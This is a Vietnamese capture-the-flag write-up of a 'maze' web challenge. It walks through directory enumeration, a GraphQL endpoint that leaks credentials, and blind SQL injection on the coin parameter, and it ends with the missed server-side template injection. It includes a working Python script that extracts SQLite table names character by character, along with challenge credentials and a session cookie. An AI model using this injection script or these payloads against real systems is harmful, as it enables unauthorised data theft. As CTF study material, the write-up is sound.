Trang web maze chỉ hiển thị 1 form đơn giản:

![image-20210124130203460](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20210124130203460.png)

View source cũng không có gì, thử inject SQL đơn giản cũng không hiện thông báo lỗi, vậy còn cách cuối cùng là kiểm tra tất cả các URL path, giới thiệu các bạn tool [dirsearch](https://github.com/maurosoria/dirsearch) siêu hay này. 

OK sau khi chạy tool ta phát hiện có đường link `/robots.txt` trả về 200, đáng nhẽ phải tính đến cái này từ đầu mới phải. Truy cập vào `/robots.txt` thì nó tiết lộ 1 đường link khác nữa `/sup3r_secr37_@p1`. Vậy lại là GraphQL:

![image-20210124130912865](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20210124130912865.png)

 các bước thao tác với graphQL tương tự như challenge `GraphQL 2.0`, ta lấy được `username`(như trên hình là `XFT`) và `password`(như trên hình là `iigvj3xMVuSI9GzXhJJWNeI`) để đăng nhập vào hệ thống:

![image-20210124131142284](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20210124131142284.png)

Lại view source và lại không có gì đặc biệt, xem xét đến các panel XFT, BTC và ETH trên trang chủ, mỗi panel ứng với 1 đường dẫn `/trade?coin=[coin_name]` . Khi thử tham số coin với những tên không trùng với 3 tên coin có sẵn, nó hiện trang web với nội dung 

![image-20210128142622931](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20210128142622931.png)

Thử SQL injection cơ bản bằng cách thêm dấu nháy đơn vào cuối URL, server trả về status code 500:

![image-20210128142725595](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20210128142725595.png)

Đến đây nếu ai nhanh nhạy chắc sẽ đoán được ngay có vấn đề(không phải mình, mình thực sự đã mất cả 1 ngày để thử những hình thức khai thác khác như `param polution`,`IDOR` , ngu thực sự). Chỉ cần thêm kí tự comment ta sẽ thấy ngay đây là 1 dạng SQL injection:

![image-20210128143026465](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20210128143026465.png)

Như vậy có thể kết luận: câu query đúng nó trả về coin `XFT`, query sai nó trả về `nothing here`, query không hợp lệ thì `500`

Đến đây lại thành bài toán khai thác blind SQL injection cơ bản rồi. Đây là đoạn script của mình để tự động dump ra tên các bảng trong database:

```python
import requests 
import string

concat_tbl_name = ''
index = 1
c = ''
url1 = "http://45.134.3.200:9000/trade?coin=xft%27%20and%20(substr((select%20group_concat(tbl_name)%20from%20sqlite_master),"
url2 = ",1))%20=%20%27"
cookies = {"session": "eyJsb2dnZWRfaW4iOnRydWV9.YBJhUA.rj2w_Rnu_l3IvdBpT6B68-kgXoQ"}
requests
while True:
    for c in string.printable:
        if c not in ['*', '+', '.', '?', '|', '#', '&', '$']:
            r = requests.get(url1 + str(index) + url2 + c, cookies=cookies)
            if 'XFT' in r.text:
                print("Found one more char : %s" % (concat_tbl_name + c))
                concat_tbl_name += c
                index += 1

```

Chạy đoạn script mất kha khá thời gian, kết quả ra:

![image-20210128144750430](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20210128144750430.png)

Tiếp tục chỉnh sửa đoạn script thì sẽ lấy được username, password vào được admin panel, tưởng thế là xong, hóa ra vào đến nơi cũng chưa có gì nốt

![image-20210205083829985](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20210205083829985.png)

View source code, để ý đến giá trị cookie, mỗi lần ta truyền vào đó 1 giá trị khác nhau thì dòng cuối cùng của đoạn tin nhắn trên cũng thay đổi: `show me what you got` + `cookie_value` Đến đây thì mình tịt hẳn, không biết làm thế nào để đi tiếp. 

Đợi đến khi end CTF đọc write-up mới biết đây là lỗ hổng SSTI, lỗi do mình sơ suất chưa thử những payload kiểu {{7*7}}, haizz. Thôi rút kinh nghiệm lần sau